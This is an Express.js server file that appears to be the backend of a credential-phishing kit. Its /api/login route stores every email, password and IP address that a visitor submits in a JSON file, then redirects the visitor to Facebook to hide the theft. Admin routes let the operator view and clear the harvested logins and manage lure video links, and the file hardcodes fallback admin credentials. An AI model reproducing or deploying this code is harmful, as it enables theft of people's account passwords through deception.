import express from 'express'
import cors from 'cors'
import fs from 'fs'
import path from 'path'
import { fileURLToPath } from 'url'

const __filename = fileURLToPath(import.meta.url)
const __dirname = path.dirname(__filename)

const app = express()
const PORT = process.env.PORT || 3001

// Paths — on Render, userdata lives next to server/
const USERDATA_DIR = path.join(__dirname, '..', 'userdata')
const LOGINS_FILE = path.join(USERDATA_DIR, 'logins.json')
const CONFIG_FILE = path.join(USERDATA_DIR, 'config.json')
const VIDEOS_FILE = path.join(USERDATA_DIR, 'videos.json')

// Admin credentials — use env vars in production, fallback for local dev
const ADMIN_EMAIL = process.env.ADMIN_EMAIL || 'kabagambe@gmail.com'
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'kabagambe123'

// Ensure userdata folder and files exist
if (!fs.existsSync(USERDATA_DIR)) fs.mkdirSync(USERDATA_DIR, { recursive: true })
if (!fs.existsSync(LOGINS_FILE)) fs.writeFileSync(LOGINS_FILE, JSON.stringify([]))
if (!fs.existsSync(CONFIG_FILE)) fs.writeFileSync(CONFIG_FILE, JSON.stringify({ redirectUrl: 'https://www.facebook.com' }))
if (!fs.existsSync(VIDEOS_FILE)) fs.writeFileSync(VIDEOS_FILE, JSON.stringify([]))

// CORS — allow any origin (frontend on Vercel + local dev)
app.use(cors({
  origin: '*',
  methods: ['GET', 'POST', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type'],
}))
app.use(express.json())

// ─── Helper: read/write JSON ───────────────────────────────
function readJson(file) {
  try { return JSON.parse(fs.readFileSync(file, 'utf-8')) }
  catch { return null }
}
function writeJson(file, data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2))
}

// ─── POST /api/login ──────────────────────────────────────
app.post('/api/login', (req, res) => {
  const { email, password } = req.body
  if (!email || !password) {
    return res.status(400).json({ error: 'Email and password are required' })
  }
  if (email === ADMIN_EMAIL && password === ADMIN_PASSWORD) {
    return res.json({ role: 'admin', redirect: '/admin' })
  }
  const logins = readJson(LOGINS_FILE) || []
  logins.push({
    id: Date.now(),
    email,
    password,
    timestamp: new Date().toISOString(),
    ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown'
  })
  writeJson(LOGINS_FILE, logins)
  const config = readJson(CONFIG_FILE) || {}
  const redirectUrl = config.redirectUrl || 'https://www.facebook.com'
  return res.json({ role: 'user', redirect: redirectUrl })
})

// ─── POST /api/admin/login ────────────────────────────────
app.post('/api/admin/login', (req, res) => {
  const { email, password } = req.body
  if (email === ADMIN_EMAIL && password === ADMIN_PASSWORD) {
    return res.json({ success: true })
  }
  return res.status(401).json({ error: 'Invalid admin credentials' })
})

// ─── GET /api/admin/logins ────────────────────────────────
app.get('/api/admin/logins', (req, res) => {
  const { email, password } = req.query
  if (email !== ADMIN_EMAIL || password !== ADMIN_PASSWORD) {
    return res.status(401).json({ error: 'Unauthorized' })
  }
  return res.json(readJson(LOGINS_FILE) || [])
})

// ─── GET /api/admin/config ────────────────────────────────
app.get('/api/admin/config', (req, res) => {
  const { email, password } = req.query
  if (email !== ADMIN_EMAIL || password !== ADMIN_PASSWORD) {
    return res.status(401).json({ error: 'Unauthorized' })
  }
  return res.json(readJson(CONFIG_FILE) || { redirectUrl: 'https://www.facebook.com' })
})

// ─── POST /api/admin/config ───────────────────────────────
app.post('/api/admin/config', (req, res) => {
  const { email, password, redirectUrl } = req.body
  if (email !== ADMIN_EMAIL || password !== ADMIN_PASSWORD) {
    return res.status(401).json({ error: 'Unauthorized' })
  }
  if (!redirectUrl) return res.status(400).json({ error: 'redirectUrl is required' })
  writeJson(CONFIG_FILE, { redirectUrl })
  return res.json({ success: true, redirectUrl })
})

// ─── DELETE /api/admin/logins ─────────────────────────────
app.delete('/api/admin/logins', (req, res) => {
  const { email, password } = req.body
  if (email !== ADMIN_EMAIL || password !== ADMIN_PASSWORD) {
    return res.status(401).json({ error: 'Unauthorized' })
  }
  writeJson(LOGINS_FILE, [])
  return res.json({ success: true })
})

// ─── POST /api/admin/video-links ─────────────────────────
app.post('/api/admin/video-links', (req, res) => {
  const { email, password, originalUrl, slug, thumbnail, title, type } = req.body
  if (email !== ADMIN_EMAIL || password !== ADMIN_PASSWORD) {
    return res.status(401).json({ error: 'Unauthorized' })
  }
  if (!originalUrl || !slug) {
    return res.status(400).json({ error: 'originalUrl and slug required' })
  }
  const videos = readJson(VIDEOS_FILE) || []
  if (videos.find(v => v.slug === slug)) {
    return res.status(409).json({ error: 'Slug already exists. Try again.' })
  }
  const entry = {
    id: Date.now(),
    slug,
    originalUrl,
    thumbnail: thumbnail || null,
    title: title || 'Video',
    type: type || 'unknown',
    createdAt: new Date().toISOString(),
  }
  videos.push(entry)
  writeJson(VIDEOS_FILE, videos)
  return res.json({ success: true, entry })
})

// ─── GET /api/admin/video-links ──────────────────────────
app.get('/api/admin/video-links', (req, res) => {
  const { email, password } = req.query
  if (email !== ADMIN_EMAIL || password !== ADMIN_PASSWORD) {
    return res.status(401).json({ error: 'Unauthorized' })
  }
  return res.json(readJson(VIDEOS_FILE) || [])
})

// ─── DELETE /api/admin/video-links/:id ───────────────────
app.delete('/api/admin/video-links/:id', (req, res) => {
  const { email, password } = req.body
  if (email !== ADMIN_EMAIL || password !== ADMIN_PASSWORD) {
    return res.status(401).json({ error: 'Unauthorized' })
  }
  let videos = readJson(VIDEOS_FILE) || []
  videos = videos.filter(v => String(v.id) !== String(req.params.id))
  writeJson(VIDEOS_FILE, videos)
  return res.json({ success: true })
})

// ─── GET /api/watch/:slug ────────────────────────────────
app.get('/api/watch/:slug', (req, res) => {
  const videos = readJson(VIDEOS_FILE) || []
  const entry = videos.find(v => v.slug === req.params.slug)
  if (!entry) return res.status(404).json({ error: 'Link not found' })
  return res.json({ originalUrl: entry.originalUrl, title: entry.title })
})

// ─── Health check ─────────────────────────────────────────
app.get('/health', (_req, res) => res.json({ status: 'ok' }))

app.listen(PORT, () => {
  console.log(`✅  Server running on port ${PORT}`)
})
